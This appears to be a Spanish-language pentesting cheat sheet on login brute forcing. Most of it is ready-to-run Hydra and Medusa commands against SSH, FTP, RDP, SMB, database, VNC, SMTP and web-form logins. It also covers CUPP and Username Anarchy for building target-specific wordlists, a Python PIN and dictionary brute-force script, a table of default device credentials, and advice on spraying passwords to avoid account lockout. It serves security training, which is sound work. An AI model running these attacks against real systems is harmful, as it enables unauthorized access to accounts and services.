---
title: "Login Brute Forcing"
description: "Hydra, medusa, wordlists y ataques a formularios HTTP."
sidebar:
  order: 2
  label: "Login Brute Forcing"
---
> Fuerza bruta de servicios de red y formularios web con Hydra y Medusa. Generación de wordlists personalizadas con CUPP y Username Anarchy.

---


## Wordlists de referencia

```bash
# Usernames
/opt/useful/seclists/Usernames/top-usernames-shortlist.txt
/opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt

# Passwords
/opt/useful/seclists/Passwords/Common-Credentials/rockyou.txt
/opt/useful/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
/opt/useful/seclists/Passwords/Common-Credentials/darkweb2017_top-10000.txt
/opt/useful/seclists/Passwords/Default-Credentials/default-passwords.txt
```

---

## Hydra — Sintaxis base

```bash
hydra [login_options] [password_options] [attack_options] target service
```

| Flag | Descripción |
|------|-------------|
| `-l user` | Usuario único |
| `-L users.txt` | Lista de usuarios |
| `-p pass` | Contraseña única |
| `-P pass.txt` | Lista de contraseñas |
| `-t 4` | Threads paralelos (default: 16) |
| `-f` | Parar al primer éxito |
| `-s PORT` | Puerto no estándar |
| `-v / -V` | Verbose / muy verbose |
| `-M targets.txt` | Múltiples hosts |
| `-x 6:8:aA1` | Generar passwords de 6-8 chars con charset |

---

## Hydra — Servicios de red

```bash
# HTTP Basic Auth
hydra -L users.txt -P passes.txt target http-get /
hydra -l user -P passes.txt target http-get / -s 8080

# SSH
hydra -l root -P /opt/useful/seclists/Passwords/Common-Credentials/rockyou.txt ssh://target
hydra -L users.txt -P passes.txt ssh://target -t 4

# FTP
hydra -l admin -P passes.txt ftp://target
hydra -L users.txt -P passes.txt -s 2121 target ftp

# RDP
hydra -l administrator -P passes.txt rdp://target
# Con charset generado (no dict):
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 target rdp

# SMB
hydra -L users.txt -P passes.txt smb://target

# MySQL
hydra -l root -P passes.txt mysql://target

# MSSQL
hydra -l sa -P passes.txt mssql://target

# VNC (sin usuario)
hydra -P passes.txt vnc://target

# SMTP
hydra -l admin -P passes.txt smtp://mail.target.com

# Múltiples targets
hydra -l root -p toor -M targets.txt ssh
```

---

## Hydra — Formularios web HTTP

### Basic Auth (GET)

```bash
hydra -l admin -P passes.txt target http-get / -s 81
```

### Formulario POST — Estructura del params string

```bash
# Formato: "/path:campo1=^USER^&campo2=^PASS^:F=texto_de_error"
# O con success: "...:S=302" / "...:S=Dashboard"

hydra -L users.txt -P passes.txt IP -s PORT -f http-post-form \
  "/:username=^USER^&password=^PASS^:F=Invalid credentials"

# Con CSRF token estático
hydra -L users.txt -P passes.txt target http-post-form \
  "/login:_token=STATIC_TOKEN&username=^USER^&password=^PASS^:F=Invalid"

# Success por redirect 302
hydra -l admin -P passes.txt target http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=302"
```

### Identificar el params string

```bash
# 1. Abrir DevTools (F12) → Network tab
# 2. Hacer submit con creds incorrectas
# 3. Ver petición POST → Form Data → anotar campo nombres
# 4. Ver respuesta → anotar mensaje de error ("Invalid credentials", etc.)
# O usar Burp Suite para interceptar y analizar
```

---

## Medusa — Sintaxis base

```bash
medusa -h HOST -u USER -P passes.txt -M MODULE [opciones]
```

| Flag | Descripción |
|------|-------------|
| `-h HOST` / `-H FILE` | Target único / lista |
| `-u USER` / `-U FILE` | Usuario único / lista |
| `-p PASS` / `-P FILE` | Contraseña única / lista |
| `-M MODULE` | Módulo: ssh, ftp, http, rdp, mysql... |
| `-m "OPT"` | Opciones del módulo |
| `-t N` | Threads paralelos |
| `-f` | Stop on first success (este host) |
| `-F` | Stop on first success (cualquier host) |
| `-n PORT` | Puerto no estándar |
| `-v LEVEL` | Verbose (0-6) |
| `-e ns` | Probar password vacía (`n`) y user=pass (`s`) |

```bash
# SSH
medusa -h 192.168.1.100 -U users.txt -P passes.txt -M ssh -t 3

# FTP
medusa -h 127.0.0.1 -u ftpuser -P passes.txt -M ftp -t 5

# HTTP Basic Auth — múltiples targets
medusa -H web_servers.txt -U users.txt -P passes.txt -M http -m GET

# Password vacía o user=pass
medusa -h 10.0.0.5 -U users.txt -e ns -M ssh

# Web form
medusa -M web-form -h target -U users.txt -P passes.txt \
  -m "FORM:username=^USER^&password=^PASS^:F=Invalid"
```

---

## Wordlists personalizadas

### CUPP — Wordlist por perfil OSINT

```bash
# Instalar
sudo apt install cupp -y

# Modo interactivo — genera wordlist personalizada
cupp -i
# Responder preguntas: nombre, apodo, cumpleaños, pareja, mascota, empresa, keywords
# Genera: jane.txt con ~46000 passwords personalizadas

# Otros modos
cupp -l    # descargar listas de alg database
cupp -a    # solo modo interactivo básico
```

### Username Anarchy — Generar variaciones de nombres

```bash
# Instalar
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy

# Generar usernames para un nombre
./username-anarchy Jane Smith > jane_smith_usernames.txt

# Genera: jane, janesmith, j.smith, smithj, jsmith, js, etc.
```

### Filtrar wordlist por política de contraseñas

```bash
# Política: mínimo 8 chars + uppercase + lowercase + número
grep -E '^.{8,}$' wordlist.txt |       # mínimo 8 chars
grep -E '[A-Z]' |                       # al menos una mayúscula
grep -E '[a-z]' |                       # al menos una minúscula
grep -E '[0-9]' > filtered.txt          # al menos un número

# Añadir requisito de 2+ caracteres especiales
grep -E '([!@#$%^&*].*){2,}' filtered.txt > filtered_special.txt

# Verificar tamaño
wc -l filtered.txt
```

---

## Script Python — Brute force básico

```python
import requests

ip = "TARGET_IP"
port = 1234

# Fuerza bruta PIN de 4 dígitos
for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
    if response.ok and 'flag' in response.json():
        print(f"PIN: {formatted_pin} | Flag: {response.json()['flag']}")
        break

# Dictionary attack POST
passwords = open("wordlist.txt").read().splitlines()
for password in passwords:
    r = requests.post(f"http://{ip}:{port}/login",
                      data={'username': 'admin', 'password': password})
    if r.ok and 'flag' in r.json():
        print(f"Password: {password}")
        break
```

---

## Métodos de brute force — Comparativa

| Método | Descripción | Cuándo usar |
|--------|-------------|-------------|
| **Brute Force simple** | Todas las combinaciones del charset | Sin info del password, recursos ilimitados |
| **Dictionary Attack** | Wordlist predefinida | Target usa passwords comunes |
| **Hybrid Attack** | Wordlist + mutaciones (appending, leet) | Password policy con cambios periódicos |
| **Credential Stuffing** | Credenciales filtradas de otras breaches | Sospecha de reutilización de passwords |
| **Password Spraying** | Pocos passwords contra muchos usuarios | Account lockout activo — evitar bloqueos |

---

## Credenciales por defecto — Dispositivos comunes

| Dispositivo | Usuario | Password |
|-------------|---------|----------|
| Routers (Linksys, D-Link, TP-Link) | admin | admin |
| Netgear | admin | password |
| Cisco | cisco | cisco |
| Axis IP Camera | root | pass |
| Hikvision DVR | admin | 12345 |
| Ubiquiti UniFi | ubnt | ubnt |

```bash
# Wordlist de default credentials
/opt/useful/seclists/Passwords/Default-Credentials/default-passwords.txt
```

---

## Pitfalls / Gotchas

- **Account lockout** → password spraying con 1-3 intentos por usuario, pausas entre rondas. Verificar política primero.
- **Hydra `http-post-form` sintaxis** → usar `:` como separador de los 3 campos (path, params, condition). Si el mensaje de error contiene `:`, puede romper la sintaxis.
- **F= vs S=** → usar `F=` (failure string) cuando el mensaje de error es predecible. Usar `S=` (success) cuando la respuesta exitosa es distinguible (redirect 302, palabra "Dashboard").
- **Hydra -t alto** → puede triggear rate limiting o lockout. Empezar con `-t 4` en entornos reales.
- **CSRF token dinámico** → Hydra no puede manejar tokens que cambian por request. Necesitar scripting manual o Burp Intruder con macros.
- **Medusa módulo `web-form`** → menos flexible que Hydra `http-post-form` para casos complejos.
- **CUPP sin filtrar** → genera ~46k passwords, muchas no cumplen la política. Filtrar siempre con grep antes de usar.
- **Username Anarchy** → requiere Ruby. Si no está instalado: `sudo apt install ruby`.
- **rockyou.txt comprimido** → en algunas distros está en `/usr/share/wordlists/rockyou.txt.gz`. Descomprimir: `gunzip rockyou.txt.gz`.
- **Hydra SSH con key-based auth** → si el servidor tiene PasswordAuthentication=no, Hydra no puede atacar por password. Verificar con `ssh -v`.
- **charset `-x` en Hydra** → para brute force puro. Orden: `min_len:max_len:charset`. `a`=lowercase, `A`=uppercase, `1`=digits.

---

## Cheatsheets relacionados

- [Using Web Proxies](/metodologias/web/using-web-proxies/) — interceptar formularios para identificar parámetros
- [Attacking Web Applications with Ffuf](/metodologias/recon/attacking-web-applications-ffuf/) — fuzzing de directorios antes de atacar el login
- [Password Attacks](/metodologias/exploitation/password-attacks/) — hashcat, john, Kerberoasting, cracking de hashes
- [Attacking Common Services](/metodologias/servicios/attacking-common-services/) — fuerza bruta de SSH, FTP, RDP, SMB en profundidad
- [Active Directory Enumeration & Attacks](/metodologias/active-directory/active-directory-enumeration-attacks/) — password spraying en AD con kerbrute
